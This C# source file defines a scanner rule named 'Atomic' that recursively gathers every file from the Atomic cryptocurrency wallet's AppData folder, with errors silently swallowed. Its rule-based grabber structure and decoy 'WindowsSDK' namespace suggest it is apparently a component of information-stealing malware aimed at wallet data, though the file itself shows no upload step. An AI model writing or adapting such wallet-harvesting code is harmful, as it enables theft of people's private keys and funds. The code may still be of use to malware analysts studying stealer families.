using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class AtomicRule : FileScannerRule
    {
        public AtomicRule()
        {
            base.Name = "Atomic";
        }

        public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
        {
            return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic", "Atomic");
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic";
                list.Add(new FileScannerArg
                {
                    Directory = directory,
                    Pattern = "*",
                    Recoursive = true
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
